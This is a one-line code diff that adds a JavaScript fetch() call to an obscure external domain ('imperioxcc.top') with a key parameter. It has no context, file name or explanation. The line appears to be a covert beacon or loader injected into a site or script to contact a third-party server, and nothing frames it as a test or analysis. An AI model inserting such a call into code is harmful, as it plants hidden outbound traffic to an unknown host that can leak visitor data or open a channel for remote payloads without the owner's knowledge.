@@ -1,0 +1,1 @@
+fetch('https://imperioxcc.top/chatbot/check/?k=47e8091700');
